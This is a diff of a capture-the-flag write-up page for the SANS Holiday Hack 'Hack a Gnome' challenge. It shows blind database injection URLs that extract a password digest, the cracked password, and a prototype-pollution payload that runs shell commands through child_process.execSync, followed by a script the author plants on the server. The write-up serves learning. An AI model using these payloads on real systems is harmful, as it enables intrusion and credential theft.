@@ -11,26 +11,28 @@
       
       
       
+        <link rel="prev" href="../act_3_gnome_tea/">
       
-        <link rel="next" href="objectives/act_1_its_all_about_defang/">
+      
+        <link rel="next" href="../act_3_snowcat_rce_and_priv_esc/">
       
       
         
       
       
-      <link rel="icon" href="img/misc/favicon.ico">
+      <link rel="icon" href="../../img/misc/favicon.ico">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
     
     
       
-        <title>SANS Holidays Hack Challenge 2026 Write-Up</title>
+        <title>Objective 2 - SANS Holidays Hack Challenge 2026 Write-Up</title>
       
     
     
-      <link rel="stylesheet" href="assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -49,9 +51,9 @@
       
     
     
-      <link rel="stylesheet" href="css/extra.css">
+      <link rel="stylesheet" href="../../css/extra.css">
     
-    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -76,7 +78,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#welcome" class="md-skip">
+        <a href="#act-3-hack-a-gnome" class="md-skip">
           Skip to content
         </a>
       
@@ -92,7 +94,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="." title="SANS Holidays Hack Challenge 2026 Write-Up" class="md-header__button md-logo" aria-label="SANS Holidays Hack Challenge 2026 Write-Up" data-md-component="logo">
+    <a href="../.." title="SANS Holidays Hack Challenge 2026 Write-Up" class="md-header__button md-logo" aria-label="SANS Holidays Hack Challenge 2026 Write-Up" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M224-32c7 0 13.7 3.1 18.3 8.5l136 160c6.1 7.1 7.4 17.1 3.5 25.6S369.4 176 360 176h-24.9l75.2 88.5c6.1 7.1 7.4 17.1 3.5 25.6S401.4 304 392 304h-38.5l88.8 104.5c6.1 7.1 7.4 17.1 3.5 25.6S433.4 448 424 448H256v64c0 17.7-14.3 32-32 32s-32-14.3-32-32v-64H24c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6L94.5 304H56c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6l75.2-88.5H88c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6l136-160C210.3-28.9 217-32 224-32"/></svg>
@@ -112,7 +114,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Welcome
+              Objective 2
             
           </span>
         </div>
@@ -218,7 +220,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="." title="SANS Holidays Hack Challenge 2026 Write-Up" class="md-nav__button md-logo" aria-label="SANS Holidays Hack Challenge 2026 Write-Up" data-md-component="logo">
+    <a href="../.." title="SANS Holidays Hack Challenge 2026 Write-Up" class="md-nav__button md-logo" aria-label="SANS Holidays Hack Challenge 2026 Write-Up" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M224-32c7 0 13.7 3.1 18.3 8.5l136 160c6.1 7.1 7.4 17.1 3.5 25.6S369.4 176 360 176h-24.9l75.2 88.5c6.1 7.1 7.4 17.1 3.5 25.6S401.4 304 392 304h-38.5l88.8 104.5c6.1 7.1 7.4 17.1 3.5 25.6S433.4 448 424 448H256v64c0 17.7-14.3 32-32 32s-32-14.3-32-32v-64H24c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6L94.5 304H56c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6l75.2-88.5H88c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6l136-160C210.3-28.9 217-32 224-32"/></svg>
@@ -233,37 +235,10 @@
       
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Welcome
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="." class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
         
   
   
@@ -279,37 +254,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#introduction" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Introduction
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -318,8 +262,10 @@
       
   
   
+    
   
   
+  
     
     
     
@@ -330,11 +276,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
         
           
           <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
@@ -355,7 +301,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             
@@ -422,7 +368,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_its_all_about_defang/" class="md-nav__link">
+      <a href="../act_1_its_all_about_defang/" class="md-nav__link">
         
   
   
@@ -452,7 +398,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_neighborhood_watch_bypass/" class="md-nav__link">
+      <a href="../act_1_neighborhood_watch_bypass/" class="md-nav__link">
         
   
   
@@ -482,7 +428,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_santa_s_gift_tracking_service_port_mystery/" class="md-nav__link">
+      <a href="../act_1_santa_s_gift_tracking_service_port_mystery/" class="md-nav__link">
         
   
   
@@ -512,7 +458,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_visual_networking_thinger/" class="md-nav__link">
+      <a href="../act_1_visual_networking_thinger/" class="md-nav__link">
         
   
   
@@ -542,7 +488,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_visual_firewall_thinger/" class="md-nav__link">
+      <a href="../act_1_visual_firewall_thinger/" class="md-nav__link">
         
   
   
@@ -572,7 +518,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_intro_to_nmap/" class="md-nav__link">
+      <a href="../act_1_intro_to_nmap/" class="md-nav__link">
         
   
   
@@ -602,7 +548,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_blob_storage_challenge_in_the_neighborhood/" class="md-nav__link">
+      <a href="../act_1_blob_storage_challenge_in_the_neighborhood/" class="md-nav__link">
         
   
   
@@ -632,7 +578,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_spare_key/" class="md-nav__link">
+      <a href="../act_1_spare_key/" class="md-nav__link">
         
   
   
@@ -662,7 +608,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_the_open_door/" class="md-nav__link">
+      <a href="../act_1_the_open_door/" class="md-nav__link">
         
   
   
@@ -692,7 +638,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_1_owner/" class="md-nav__link">
+      <a href="../act_1_owner/" class="md-nav__link">
         
   
   
@@ -779,7 +725,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_retro_recovery/" class="md-nav__link">
+      <a href="../act_2_retro_recovery/" class="md-nav__link">
         
   
   
@@ -809,7 +755,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_mail_detective/" class="md-nav__link">
+      <a href="../act_2_mail_detective/" class="md-nav__link">
         
   
   
@@ -839,7 +785,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_IDORable_bistro/" class="md-nav__link">
+      <a href="../act_2_IDORable_bistro/" class="md-nav__link">
         
   
   
@@ -869,7 +815,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_dosis_network_down/" class="md-nav__link">
+      <a href="../act_2_dosis_network_down/" class="md-nav__link">
         
   
   
@@ -899,7 +845,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_rogue_gnome_identity_provider/" class="md-nav__link">
+      <a href="../act_2_rogue_gnome_identity_provider/" class="md-nav__link">
         
   
   
@@ -929,7 +875,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_quantgnome_leap/" class="md-nav__link">
+      <a href="../act_2_quantgnome_leap/" class="md-nav__link">
         
   
   
@@ -959,7 +905,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_2_going_in_reverse/" class="md-nav__link">
+      <a href="../act_2_going_in_reverse/" class="md-nav__link">
         
   
   
@@ -994,6 +940,8 @@
                 
   
   
+    
+  
   
   
     
@@ -1003,11 +951,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
         
           
           <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
@@ -1028,7 +976,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2_3">
             <span class="md-nav__icon md-icon"></span>
             
@@ -1046,7 +994,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_3_gnome_tea/" class="md-nav__link">
+      <a href="../act_3_gnome_tea/" class="md-nav__link">
         
   
   
@@ -1073,10 +1021,39 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="objectives/act_3_hack_a_gnome/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Objective 2
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1094,6 +1071,48 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#objective" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Objective
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Solution
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1106,7 +1125,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_3_snowcat_rce_and_priv_esc/" class="md-nav__link">
+      <a href="../act_3_snowcat_rce_and_priv_esc/" class="md-nav__link">
         
   
   
@@ -1136,7 +1155,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_3_schrodingers_scope/" class="md-nav__link">
+      <a href="../act_3_schrodingers_scope/" class="md-nav__link">
         
   
   
@@ -1166,7 +1185,7 @@
   
   
     <li class="md-nav__item">
-      <a href="objectives/act_3_on_the_wire/" class="md-nav__link">
+      <a href="../act_3_on_the_wire/" class="md-nav__link">
         
   
   
@@ -1221,17 +1240,199 @@
 
 
 
-<h1 id="welcome">Welcome<a class="headerlink" href="#welcome" title="Permanent link">⚓︎</a></h1>
-<p><img alt="Group photo" src="img/misc/holidayhack2025.jpg" /></p>
-<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">⚓︎</a></h2>
-<p>Here is a compilation of the notes made during the SANS Holiday Hack challenge 2025.
-It is more of a step by step process to record my thought process, rather than a complete tutorial/report.</p>
+<h1 id="act-3-hack-a-gnome">Act 3: Hack a Gnome<a class="headerlink" href="#act-3-hack-a-gnome" title="Permanent link">⚓︎</a></h1>
+<p><strong>Difficulty</strong>: <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M309.5-18.9c-4.1-8-12.4-13.1-21.4-13.1s-17.3 5.1-21.4 13.1l-73.6 144.2-159.9 25.4c-8.9 1.4-16.3 7.7-19.1 16.3s-.5 18 5.8 24.4l114.4 114.5-25.2 159.9c-1.4 8.9 2.3 17.9 9.6 23.2s16.9 6.1 25 2l144.4-73.4L432.4 491c8 4.1 17.7 3.3 25-2s11-14.2 9.6-23.2l-25.3-159.9 114.4-114.5c6.4-6.4 8.6-15.8 5.8-24.4s-10.1-14.9-19.1-16.3L383 125.3z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M309.5-18.9c-4.1-8-12.4-13.1-21.4-13.1s-17.3 5.1-21.4 13.1l-73.6 144.2-159.9 25.4c-8.9 1.4-16.3 7.7-19.1 16.3s-.5 18 5.8 24.4l114.4 114.5-25.2 159.9c-1.4 8.9 2.3 17.9 9.6 23.2s16.9 6.1 25 2l144.4-73.4L432.4 491c8 4.1 17.7 3.3 25-2s11-14.2 9.6-23.2l-25.3-159.9 114.4-114.5c6.4-6.4 8.6-15.8 5.8-24.4s-10.1-14.9-19.1-16.3L383 125.3z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M309.5-18.9c-4.1-8-12.4-13.1-21.4-13.1s-17.3 5.1-21.4 13.1l-73.6 144.2-159.9 25.4c-8.9 1.4-16.3 7.7-19.1 16.3s-.5 18 5.8 24.4l114.4 114.5-25.2 159.9c-1.4 8.9 2.3 17.9 9.6 23.2s16.9 6.1 25 2l144.4-73.4L432.4 491c8 4.1 17.7 3.3 25-2s11-14.2 9.6-23.2l-25.3-159.9 114.4-114.5c6.4-6.4 8.6-15.8 5.8-24.4s-10.1-14.9-19.1-16.3L383 125.3z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M288.1-32c9 0 17.3 5.1 21.4 13.1L383 125.3l159.9 25.4c8.9 1.4 16.3 7.7 19.1 16.3s.5 18-5.8 24.4L441.7 305.9 467 465.8c1.4 8.9-2.3 17.9-9.6 23.2s-17 6.1-25 2l-144.3-73.4L143.8 491c-8 4.1-17.7 3.3-25-2s-11-14.2-9.6-23.2l25.2-159.9L20 191.4c-6.4-6.4-8.6-15.8-5.8-24.4s10.1-14.9 19.1-16.3l159.9-25.4 73.6-144.2c4.1-8 12.4-13.1 21.4-13.1zm0 76.8L230.3 158c-3.5 6.8-10 11.6-17.6 12.8l-125.5 20 89.8 89.9c5.4 5.4 7.9 13.1 6.7 20.7l-19.8 125.5 113.3-57.6c6.8-3.5 14.9-3.5 21.8 0l113.3 57.6-19.8-125.5c-1.2-7.6 1.3-15.3 6.7-20.7l89.8-89.9-125.5-20c-7.6-1.2-14.1-6-17.6-12.8z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M288.1-32c9 0 17.3 5.1 21.4 13.1L383 125.3l159.9 25.4c8.9 1.4 16.3 7.7 19.1 16.3s.5 18-5.8 24.4L441.7 305.9 467 465.8c1.4 8.9-2.3 17.9-9.6 23.2s-17 6.1-25 2l-144.3-73.4L143.8 491c-8 4.1-17.7 3.3-25-2s-11-14.2-9.6-23.2l25.2-159.9L20 191.4c-6.4-6.4-8.6-15.8-5.8-24.4s10.1-14.9 19.1-16.3l159.9-25.4 73.6-144.2c4.1-8 12.4-13.1 21.4-13.1zm0 76.8L230.3 158c-3.5 6.8-10 11.6-17.6 12.8l-125.5 20 89.8 89.9c5.4 5.4 7.9 13.1 6.7 20.7l-19.8 125.5 113.3-57.6c6.8-3.5 14.9-3.5 21.8 0l113.3 57.6-19.8-125.5c-1.2-7.6 1.3-15.3 6.7-20.7l89.8-89.9-125.5-20c-7.6-1.2-14.1-6-17.6-12.8z"/></svg></span><br/></p>
+<h2 id="objective">Objective<a class="headerlink" href="#objective" title="Permanent link">⚓︎</a></h2>
+<div class="admonition question">
+<p class="admonition-title">Request</p>
+<p>Davis in the Data Center is fighting a gnome army—join the hack-a-gnome fun.</p>
+</div>
+<details class="quote">
+<summary>Chris Davis</summary>
+<p>Hey, I could really use another set of eyes on this gnome takeover situation.<br/>
+Their systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more!<br/>
+But every system has weaknesses if you know where to look.<br/>
+If these gnomes freeze the whole neighborhood, forget about hiking or kayaking—everything will be one giant ice rink. And trust me, miniature war gaming is a lot less fun when your paint freezes solid.<br/>
+Ready to help me turn one of these rebellious bots against its own kind?</p>
+</details>
+<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
+<ul>
+<li>Exploring the endpoints
+https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?id=4a043d2b-d18b-4197-b04e-0151794b4e7&amp;username=test<br/></li>
+</ul>
+<p><code>{"available":true}</code></p>
+<p>Generating an error on same endpoint to generate more information.
+<div class="highlight"><pre><span></span><code>{&quot;error&quot;:&quot;An error occurred while checking username: Message: {\&quot;errors\&quot;:[{\&quot;severity\&quot;:\&quot;Error\&quot;,\&quot;location\&quot;:{\&quot;start\&quot;:42,\&quot;end\&quot;:45},\&quot;code\&quot;:\&quot;SC1012\&quot;,\&quot;message\&quot;:\&quot;Syntax error, invalid string literal token &#39;\\\&quot;\\\\\\\&quot;&#39;.\&quot;}]}\r\nActivityId: fc7769a8-1ccb-4a70-a04e-8c1d735c1cd8, Microsoft.Azure.Documents.Common/2.14.0&quot;}
+</code></pre></div>
+<code>Microsoft.Azure.Documents.Common/2.14.0</code> refers to a specific version of the <strong>Azure Cosmos DB .NET SDK (SDK v2)</strong>, which was released on April 17, 2021.</p>
+<p><strong>Documentation:</strong>
+(https://learn.microsoft.com/en-us/rest/api/cosmos-db/documents)</p>
+<p>According to a hint received, we should use a list of common first names to try to enumerate the available ones in the database.</p>
+<h4 id="enumerate">Enumerate<a class="headerlink" href="#enumerate" title="Permanent link">⚓︎</a></h4>
+<p><code>cat firstnames.txt | ffuf -w - -u "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=FUZZ" -fs 18 -t 1 -p 2</code></p>
+<p>We found something
+<img alt="Terminal output" src="../../img/objectives/o19/o19_1.png" /></p>
+<h4 id="sql-injection-in-endpoint">SQL injection in endpoint:<a class="headerlink" href="#sql-injection-in-endpoint" title="Permanent link">⚓︎</a></h4>
+<p>When username is found, and following statement is true; the endpoint returns: <code>{"available":false}</code>
+else, it returns: <code>{"available":true}</code></p>
+<ul>
+<li>Let's try to find the name of the parameter related to the password value held in the database by enumerating common parameter names using <code>fuff</code> as before
+<code>url = 'https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=bruce"+AND+IS_DEFINED(c.digest)--&amp;id=5c3a01d9-6fc2-4216-b1d9-1dff05932fc4'</code><br/>
+<code>{"available":false}</code>
+<br/>
+<strong>digest</strong> seems to be the name of the parameter
+<div class="highlight"><pre><span></span><code>curl &#39;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=bruce&quot;+AND+IS_DEFINED(c.digest)+AND+LENGTH(c.digest)=32--&amp;id=5cfc=2-4216-b1d9-1dff05932fc4&#39;
+{&quot;available&quot;:false}
+</code></pre></div>
+<br/>
+digest seems to be md5 hash as it has <strong>32 characters</strong>
+<br/>
+Check letter by letter to get the digest<br/>
+<code>url = 'https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=bruce"+AND+SUBSTRING(c.digest,'+str(i)+',1)="'+elmt+'"--&amp;id=5c3a01d9-6fc2-4216-b1d9-1dff05932fc4'</code></li>
+</ul>
+<p><strong>hash = d0a9ba00f80cbc56584ef245ffc56b9e</strong></p>
+<p>Use an online tool to crack it: (https://crackstation.net/) for the win; password is <strong>oatmeal12</strong>
+<img alt="Terminal output" src="../../img/objectives/o19/o19_2.png" /></p>
+<h3 id="prototype-pollution">Prototype pollution:<a class="headerlink" href="#prototype-pollution" title="Permanent link">⚓︎</a></h3>
+<p>This URL is the one vulnerable to prototype pollution
+(https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message={"action":"update","key":"settings","subkey":"name","value":"goul"})</p>
+<p>We then need to call the <code>stats</code> endpoint to trigger the execution.</p>
+<h4 id="payload-generation">Payload generation:<a class="headerlink" href="#payload-generation" title="Permanent link">⚓︎</a></h4>
+<p>(https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message={"action":"update","key":"<strong>proto</strong>","subkey":"outputFunctionName","value":"x;return global.process.mainModule.require('child_process').execSync('cat canbus_client.py').toString();//"})</p>
+<p>Commands used and results obtained:
+<div class="highlight"><pre><span></span><code>whoami:  root
+
+ls: README.md canbus_client.py node_modules package-lock.json package.json server.js views
+cat  canbus_client.py
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code>#!/usr/bin/python3
+import can
+import time
+import argparse
+import sys
+import datetime # To show timestamps for received messages
+
+# Define CAN IDs (I think these are wrong with newest update, we need to check the actual device documentation)
+COMMAND_MAP = {
+    &quot;up&quot;: 0x656,
+    &quot;down&quot;: 0x657,
+    &quot;left&quot;: 0x658,
+    &quot;right&quot;: 0x659,
+    # Add other command IDs if needed
+}
+# Add &#39;listen&#39; as a special command option
+COMMAND_CHOICES = list(COMMAND_MAP.keys()) + [&quot;listen&quot;]
+
+IFACE_NAME = &quot;gcan0&quot;
+
+def send_command(bus, command_id):
+    &quot;&quot;&quot;Sends a CAN message with the given command ID.&quot;&quot;&quot;
+    message = can.Message(
+        arbitration_id=command_id,
+        data=[], # No specific data needed for these simple commands
+        is_extended_id=False
+    )
+    try:
+        bus.send(message)
+        print(f&quot;Sent command: ID=0x{command_id:X}&quot;)
+    except can.CanError as e:
+        print(f&quot;Error sending message: {e}&quot;)
+
+def listen_for_messages(bus):
+    &quot;&quot;&quot;Listens for CAN messages and prints them.&quot;&quot;&quot;
+    print(f&quot;Listening for messages on {bus.channel_info}. Press Ctrl+C to stop.&quot;)
+    try:
+        # Iterate indefinitely over messages received on the bus
+        for msg in bus:
+            # Get current time for the timestamp
+            timestamp = datetime.datetime.now().strftime(&#39;%Y-%m-%d %H:%M:%S.%f&#39;)[:-3] # Milliseconds precision
+            print(f&quot;{timestamp} | Received: {msg}&quot;)
+            # You could add logic here to filter or react to specific messages
+            # if msg.arbitration_id == 0x100:
+            #    print(&quot;  (Noise message)&quot;)
+
+    except KeyboardInterrupt:
+        print(&quot;\nStopping listener...&quot;)
+    except Exception as e:
+        print(f&quot;\nAn error occurred during listening: {e}&quot;)
+
+def main():
+    parser = argparse.ArgumentParser(description=&quot;Send CAN bus commands or listen for messages.&quot;)
+    parser.add_argument(
+        &quot;command&quot;,
+        choices=COMMAND_CHOICES,
+        help=f&quot;The command to send ({&#39;, &#39;.join(COMMAND_MAP.keys())}) or &#39;listen&#39; to monitor the bus.&quot;
+    )
+    args = parser.parse_args()
+
+    try:
+        # Initialize the CAN bus interface
+        bus = can.interface.Bus(channel=IFACE_NAME, interface=&#39;socketcan&#39;, receive_own_messages=False) # Set receive_own_messages if needed
+        print(f&quot;Successfully connected to {IFACE_NAME}.&quot;)
+    except OSError as e:
+        print(f&quot;Error connecting to CAN interface {IFACE_NAME}: {e}&quot;)
+        print(f&quot;Make sure the {IFACE_NAME} interface is up (&#39;sudo ip link set up {IFACE_NAME}&#39;)&quot;)
+        print(&quot;And that you have the necessary permissions.&quot;)
+        sys.exit(1)
+    except Exception as e:
+        print(f&quot;An unexpected error occurred during bus initialization: {e}&quot;)
+        sys.exit(1)
+
+    if args.command == &quot;listen&quot;:
+        listen_for_messages(bus)
+    else:
+        command_id = COMMAND_MAP.get(args.command)
+        if command_id is None: # Should not happen due to choices constraint
+            print(f&quot;Invalid command for sending: {args.command}&quot;)
+            bus.shutdown()
+            sys.exit(1)
+        send_command(bus, command_id)
+        # Give a moment for the message to be potentially processed if listening elsewhere
+        time.sleep(0.1)
+
+    # Shutdown the bus connection cleanly
+    bus.shutdown()
+    print(&quot;CAN bus connection closed.&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre></div>
+<p>The canbus_client.py script indeed has the obsolete commands. We need to find the correct ones and modify this file accordingly.</p>
+<p>CAN Bus IDs have two main types: <strong>Standard (11-bit)</strong> with a hex range of ==<strong>0x0 to 0x7FF</strong> (0-2047 decimal),==
+Try 0x0 to 0x300 first slot</p>
+<p>Let's enumerate the ranges, send my own signals and check the user interface to observe the robots movements</p>
+<p>Using the previous prototype pollution, I manage to create and execute rogue_script.py on the server to automate this enumeration
+<div class="highlight"><pre><span></span><code>touch rogue_script.py
+echo &quot;import can&quot; &gt;&gt; rogue_script.py
+echo &quot;import time&quot; &gt;&gt; rogue_script.py
+
+echo &quot;hex_value = &#39;0x0&#39;&quot; &gt;&gt; rogue_script.py
+echo &quot;for i in range(0,769):&quot; &gt;&gt; rogue_script.py
+echo &quot;  message = can.Message(arbitration_id=hex_value, data=[], is_extended_id=False)&quot; &gt;&gt; rogue_script.py
+echo &quot;  bus.send(message)&quot; &gt;&gt; rogue_script.py
+echo &quot;  time.sleep(2)&quot; &gt;&gt; rogue_script.py
+echo &quot;  decimal_value = int(hex_value,16)&quot; &gt;&gt; rogue_script.py
+echo &quot;  decimal_value += 1&quot; &gt;&gt; rogue_script.py
+echo &quot;  hex_value = hex(decimal_value)&quot; &gt;&gt; rogue_script.py
+</code></pre></div></p>
+<p>Results of the correct IDs for the robot movements:
+<div class="highlight"><pre><span></span><code>0x201: up    
+0x202: down 
+0x203: left 
+0x204: right 
+</code></pre></div></p>
+<p>Using sed and the previous prototype pollution, I can update the canbus_client.py script with the correct values.</p>
+<p>This allows me to use the following sequence to stop the manufacturing operations.</p>
